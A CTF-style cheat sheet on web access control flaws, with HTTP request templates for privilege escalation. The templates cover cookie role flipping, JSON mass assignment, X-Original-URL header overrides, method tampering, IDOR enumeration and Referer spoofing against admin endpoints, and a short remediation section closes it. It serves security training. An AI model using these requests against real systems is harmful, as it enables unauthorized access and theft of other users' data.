# Access Control Vulnerabilities — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, AutoRepeater, Autorize  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

Access control enforces policies ensuring users cannot act outside their intended permissions. Flaws lead to Vertical Privilege Escalation (User → Admin) or Horizontal Privilege Escalation (User A → User B).

1. **Map Roles & Permissions:** Always test with at least two accounts (Admin/User or UserA/UserB).
2. **Inspect Hidden Administrative Routes:**
   - Review `robots.txt`, sitemaps, and client-side JavaScript (`/admin`, `/admin-panel`, unlinked UUID paths).
3. **Test Horizontal Escalation (IDOR / BOLA):**
   - Identify user-specific identifiers in URLs, headers, cookies, and JSON (`?id=123`, `?user=carlos`, `/api/users/GUID`).
4. **Test Vertical Escalation (Role Manipulation):**
   - Check if roles are controlled by cookies (`Admin=true`), parameters (`role=admin`), or JSON mass assignment (`"roleid": 2`).
5. **Test Framework / Header Bypasses:**
   - Test override headers (`X-Original-URL: /admin`, `X-Rewrite-URL: /admin`).
   - Test HTTP method tampering (`POST` blocked → try `GET`, `PUT`, `OPTIONS`).
   - Check multi-step workflows for missing authorization on final execution steps.

---

## 2. Vertical Privilege Escalation

### 1. Unprotected Admin Portals
- **Recon:** Check `robots.txt` or HTML source for unlinked endpoints:
  ```http
  GET /robots.txt HTTP/2
  Disallow: /administrator-panel
  ```
- **Client-Side JS Leakage:** Search JS scripts for conditional navigation:
  ```javascript
  if (data.isAdmin) {
      var adminLink = document.createElement('a');
      adminLink.href = '/admin-pwn73821';
  }
  ```

---

### 2. Role Parameters in Cookies & Requests
- **Cookie Manipulation:** Check cookies for privilege flags:
  ```http
  Cookie: Admin=false  -->  Change to: Cookie: Admin=true
  Cookie: role=user    -->  Change to: Cookie: role=admin
  ```
- **JSON Mass Assignment:** When updating user profiles, supply extra administrative attributes:
  ```json
  POST /my-account/change-email HTTP/2
  {
      "email": "user@test.com",
      "roleid": 2
  }
  ```

---

### 3. URL-Based Access Control Bypasses via HTTP Headers
Front-end reverse proxies block access to `/admin`, but backend frameworks (such as Symfony/Spring) parse custom override headers:

```http
GET / HTTP/2
Host: TARGET.net
X-Original-URL: /admin/delete?username=carlos
```
*Alternative header:*
```http
X-Rewrite-URL: /admin/delete?username=carlos
```

---

### 4. Method-Based Access Control Bypasses
The front-end restricts `POST /admin/upgrade-user`, but the backend accepts alternative HTTP methods:

```http
# Blocked:
POST /admin/upgrade-user HTTP/2

# Bypass A (Convert to GET):
GET /admin/upgrade-user?username=carlos&action=upgrade HTTP/2

# Bypass B (Method Override Header):
POST /admin/upgrade-user HTTP/2
X-HTTP-Method-Override: PUT
```

---

## 3. Horizontal Privilege Escalation & IDOR

### 1. Direct Identifier Manipulation (BOLA / IDOR)
- **Vulnerable URL:** `GET /my-account?id=wiener`
- **Exploitation:** Change identifier to target victim:
  ```http
  GET /my-account?id=carlos HTTP/2
  ```
- **Data Leakage in 302 Redirect:** If the server returns a `302 Found` redirecting to `/login`, check the response body in Burp Repeater; the sensitive account content is often generated before the redirect header is issued.

---

### 2. Static File IDOR (Transcript / Receipt Downloads)
- Look for predictable numeric paths:
  ```http
  GET /download-transcript/1.txt HTTP/2
  GET /download-transcript/2.txt HTTP/2
  ```
- Use **Burp Intruder** (Sniper on integer range) to dump all user session transcripts, receipts, or invoices.

---

### 3. Unpredictable GUIDs Leaked Publicly
When user IDs are UUIDs (e.g., `d781b2...`), search public user activity (blog comments, product reviews, public profiles) to correlate usernames with their internal GUIDs, then inject the GUID into the target endpoint.

---

## 4. Multi-Step Workflows & Referer Bypasses

### 1. Unprotected Confirmation Steps
Applications enforce role checks on Step 1, but fail to verify permissions on the final confirmation step:
- Step 1 (Forbidden): `POST /admin/set-role` (Requires Admin)
- Step 2 (Unchecked): `POST /admin/set-role/confirm?user=carlos&role=admin` (Accepts normal user cookies)

---

### 2. Referer-Based Access Control
The application naively trusts the `Referer` header to grant administrative access:

```http
GET /admin/delete?username=carlos HTTP/2
Host: TARGET.net
Referer: https://TARGET.net/admin
Cookie: session=NORMAL_USER_SESSION
```

---

## 5. CTF Quick Reference

| Flaw Category | Test / Trigger | Bypass / Exploit Action |
|---|---|---|
| **Hidden Route** | JS source / `robots.txt` | Direct navigation to `/admin-xyz` |
| **Header Override**| Front-end blocks `/admin` | Add `X-Original-URL: /admin` |
| **Method Tampering**| `POST` restricted | Change method to `GET` or `PUT` |
| **IDOR** | `?id=user` parameter | Swap ID to victim username/GUID |
| **Mass Assignment** | Profile update JSON | Add `"roleid": 2` or `"isAdmin": true` |
| **Multi-step** | Multi-phase form | Send final step request directly |
| **Referer Check** | Access control relies on origin| Add `Referer: https://target.net/admin` |

---

## 6. Remediation

- **Deny by Default:** Reject access unless explicitly granted.
- **Enforce Server-Side Session Validation:** Determine user roles exclusively from the authenticated session store, never from client-controlled headers, cookies, or parameters.
- **Centralize Access Control:** Enforce authorization checks in an application middleware layer rather than on individual controllers.
